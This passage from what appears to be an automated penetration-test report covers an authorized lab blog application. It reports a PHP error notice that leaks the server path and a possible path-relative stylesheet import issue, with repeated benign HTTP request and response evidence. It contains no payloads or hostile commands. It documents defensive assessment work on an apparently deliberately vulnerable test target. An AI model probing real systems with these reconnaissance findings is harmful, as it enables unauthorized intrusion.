                    <p>Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....</p>
                </div><div class='post'>
                    <h2>Decoding Tech Trends</h2>
                    <p>Category: Tech</p>
                    <img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/>
                    <p>An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....</p>
                </div><div class='post'>
                    <h2>The Future of Robotics</h2>
                    <p>Category: Tech</p>
                    <img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/>
                    <p>Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....</p>
                </div><div class='post'>
                    <h2>Mediterranean Diet Secrets</h2>
                    <p>Category: Cooking</p>
                    <img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/>
                    <p>Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....</p>
                </div><div class='post'>
                    <h2>The Art of French Baking</h2>
                    <p>Category: Cooking</p>
                    <img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/>
                    <p>Master the art of French baking with these simple steps for making the perfect croissant....</p>
                </div><div class='post'>
                    <h2>Beyond the Camera Lens</h2>
                    <p>Category: Photography</p>
                    <img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/>
                    <p>Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....</p>
                </div><div class='post'>
                    <h2>Urban Photography Tips</h2>
                    <p>Category: Photography</p>
                    <img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/>
                    <p>Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....</p>
                </div><div class='post'>
                    <h2>The Healing Power of Yoga</h2>
                    <p>Category: Health</p>
                    <img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/>
                    <p>Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....</p>
                </div></div>
<a href="admin.php">Admin Login</a>
</body>
</html>
```

<a id="finding-4"></a>

### 4. [LOW] [info-disclosure] PHP error notices leak server path and language on every page load

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32821/

The root page emits PHP `Notice`-level errors in its HTML response on every request: `Notice: Undefined variable: category in /var/www/html/index.php on line 28` — repeated six times per page load. This discloses the server-side language (PHP), the full filesystem path (`/var/www/html/index.php`), and a code defect (uninitialized variable) in plaintext. No user interaction or special input is required; the errors appear regardless of whether a `category` query parameter is supplied.

**Reproduction**

```
1. GET http://target.local:32821/ (no parameters needed).
2. Observe the HTML body: six occurrences of `&lt;b&gt;Notice&lt;/b&gt;: Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;` are present in plaintext between dropdown `&lt;option&gt;` tags.
3. Compare with GET /styles.css — a static resource returns no PHP notices.
```

**Evidence**

- Evidence `ev-mqy3bbs5-c` — `artifacts/s-0001/ev-mqy3bbs5-c/`

Request:

```http
GET /styles.css HTTP/1.1
Host: target.local:32821
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
accept-ranges: bytes
connection: Keep-Alive
content-length: 453
content-type: text/css
date: Sun, 28 Jun 2026 17:56:08 GMT
etag: "1c5-6553e0413be40-gzip"
keep-alive: timeout=5, max=100
last-modified: Sat, 27 Jun 2026 15:38:25 GMT
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding

body {
    font-family: Arial, sans-serif;
    background-color: #f4f4f9;
    margin: 0;
    padding: 20px;
}
.container {
    width: 80%;
    margin: auto;
    background: white;
    padding: 20px;
    border-radius: 8px;
}
.post {
    border-bottom: 1px solid #ccc;
    padding-bottom: 20px;
    margin-bottom: 20px;
}
.post h2 a {
    color: #333;
    text-decoration: none;
}
.post img {
    width: 100%;
    height: auto;
    border-radius: 5px;
}
```

- Evidence `ev-mqy39ipy-4` — `artifacts/s-0001/ev-mqy39ipy-4/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32821
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 5666
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 17:54:43 GMT
keep-alive: timeout=5, max=65
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    <div class='post'>
                    <h2>The Magic of Morning Dew</h2>
                    <p>Category: Nature</p>
                    <img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/>
                    <p>Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....</p>
                </div><div class='post'>
                    <h2>Sunset Serenades</h2>
                    <p>Category: Nature</p>
                    <img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/>
                    <p>As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....</p>
                </div><div class='post'>
                    <h2>Forest Whisperings</h2>
                    <p>Category: Nature</p>
                    <img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/>
                    <p>Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....</p>
                </div><div class='post'>
                    <h2>Decoding Tech Trends</h2>
                    <p>Category: Tech</p>
                    <img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/>
                    <p>An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....</p>
                </div><div class='post'>
                    <h2>The Future of Robotics</h2>
                    <p>Category: Tech</p>
                    <img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/>
                    <p>Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....</p>
                </div><div class='post'>
                    <h2>Mediterranean Diet Secrets</h2>
                    <p>Category: Cooking</p>
                    <img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/>
                    <p>Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....</p>
                </div><div class='post'>
                    <h2>The Art of French Baking</h2>
                    <p>Category: Cooking</p>
                    <img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/>
                    <p>Master the art of French baking with these simple steps for making the perfect croissant....</p>
                </div><div class='post'>
                    <h2>Beyond the Camera Lens</h2>
                    <p>Category: Photography</p>
                    <img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/>
                    <p>Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....</p>
                </div><div class='post'>
                    <h2>Urban Photography Tips</h2>
                    <p>Category: Photography</p>
                    <img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/>
                    <p>Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....</p>
                </div><div class='post'>
                    <h2>The Healing Power of Yoga</h2>
                    <p>Category: Health</p>
                    <img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/>
                    <p>Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....</p>
                </div></div>
<a href="admin.php">Admin Login</a>
</body>
</html>
```

- Evidence `ev-mqy3bc0h-d` — `artifacts/s-0001/ev-mqy3bc0h-d/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32821
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 5666
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 17:56:08 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    <div class='post'>
                    <h2>The Magic of Morning Dew</h2>
                    <p>Category: Nature</p>
                    <img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/>
                    <p>Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....</p>
                </div><div class='post'>
                    <h2>Sunset Serenades</h2>
                    <p>Category: Nature</p>
                    <img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/>
                    <p>As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....</p>
                </div><div class='post'>
                    <h2>Forest Whisperings</h2>
                    <p>Category: Nature</p>
                    <img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/>
                    <p>Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....</p>
                </div><div class='post'>
                    <h2>Decoding Tech Trends</h2>
                    <p>Category: Tech</p>
                    <img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/>
                    <p>An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....</p>
                </div><div class='post'>
                    <h2>The Future of Robotics</h2>
                    <p>Category: Tech</p>
                    <img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/>
                    <p>Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....</p>
                </div><div class='post'>
                    <h2>Mediterranean Diet Secrets</h2>
                    <p>Category: Cooking</p>
                    <img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/>
                    <p>Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....</p>
                </div><div class='post'>
                    <h2>The Art of French Baking</h2>
                    <p>Category: Cooking</p>
                    <img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/>
                    <p>Master the art of French baking with these simple steps for making the perfect croissant....</p>
                </div><div class='post'>
                    <h2>Beyond the Camera Lens</h2>
                    <p>Category: Photography</p>
                    <img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/>
                    <p>Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....</p>
                </div><div class='post'>
                    <h2>Urban Photography Tips</h2>
                    <p>Category: Photography</p>
                    <img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/>
                    <p>Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....</p>
                </div><div class='post'>
                    <h2>The Healing Power of Yoga</h2>
                    <p>Category: Health</p>
                    <img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/>
                    <p>Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....</p>
                </div></div>
<a href="admin.php">Admin Login</a>
</body>
</html>
```

<a id="finding-5"></a>

### 5. [INFO] [burp] Path-relative style sheet import (3 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. The page does not contain a doctype directive, and  [+2 more URL(s): http://target.local:32821/admin.php, http://target.local:32821/index.php] @ http://target.local:32821/

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqy3sz3x-1u` — `artifacts/_/ev-mqy3sz3x-1u/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32821

GET / HTTP/1.1
Host: target.local:32821
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 200 OK
Date: Sun, 28 Jun 2026 18:09:21 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 5666
Content-Type: text/html; charset=UTF-8


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    <div class='post'>
                    <h2>The Magic of Morning Dew</h2>
                    <p>Category: Nature</p>
                    <img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/>
                    <p>Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....</p>
                </div><div class='post'>
                    <h2>Sunset Serenades</h2>
                    <p>Category: Nature</p>
                    <img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/>
                    <p>As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....</p>
                </div><div class='post'>
                    <h2>Forest Whisperings</h2>
                    <p>Category: Nature</p>
                    <img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/>
                    <p>Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....</p>
                </div><div class='post'>
                    <h2>Decoding Tech Trends</h2>
                    <p>Category: Tech</p>
                    <img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/>
                    <p>An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....</p>
                </div><div class='post'>
                    <h2>The Future of Robotics</h2>
                    <p>Category: Tech</p>
                    <img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/>
                    <p>Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....</p>
                </div><div class='post'>
                    <h2>Mediterranean Diet Secrets</h2>
                    <p>Category: Cooking</p>
                    <img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/>
                    <p>Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....</p>
                </div><div class='post'>
                    <h2>The Art of French Baking</h2>
                    <p>Category: Cooking</p>
                    <img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/>
                    <p>Master the art of French baking with these simple steps for making the perfect croissant....</p>
                </div><div class='post'>
                    <h2>Beyond the Camera Lens</h2>
                    <p>Category: Photography</p>
                    <img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/>
                    <p>Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....</p>
                </div><div class='post'>
                    <h2>Urban Photography Tips</h2>
                    <p>Category: Photography</p>
                    <img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/>
                    <p>Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....</p>
                </div><div class='post'>
                    <h2>The Healing Power of Yoga</h2>
                    <p>Category: Health</p>
                    <img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/>
                    <p>Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....</p>
                </div></div>
<a href="admin.php">Admin Login</a>
</body>
</html>
```
